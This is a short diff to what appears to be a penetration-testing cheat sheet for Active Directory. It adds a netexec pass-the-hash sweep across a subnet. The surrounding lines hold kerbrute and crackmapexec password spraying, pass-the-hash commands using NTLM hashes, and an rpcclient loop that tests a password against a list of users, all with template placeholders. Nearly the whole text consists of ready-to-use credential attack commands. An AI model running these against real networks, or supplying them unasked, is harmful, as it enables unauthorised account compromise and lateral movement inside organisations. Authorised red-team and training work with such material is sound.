@@ -106,6 +106,7 @@ kerbrute passwordspray -d {{DOMAIN}} --dc {{DC_IP}} {{USERLIST}} {{PASSWORD}}
 sudo crackmapexec smb {{DC_IP}} -u {{USERLIST}} -p {{PASSWORD}} --continue-on-success | grep +
 sudo crackmapexec smb {{DC_IP}} -u {{USERNAME}} -p {{PASSWORD}}                  # single account
 sudo crackmapexec smb --local-auth {{SUBNET}} -u {{USERNAME}} -H {{NTLM_HASH}} | grep +   # PtH sweep
+sudo nxc smb {{SUBNET}} --local-auth -u {{USERNAME}} -H {{NTLM_HASH}} | grep +            # same, netexec (maintained CME)
 
 # rpcclient loop
 for u in $(cat valid_users.txt); do rpcclient -U "$u%{{PASSWORD}}" -c "getusername;quit" {{DC_IP}} | grep Authority; done
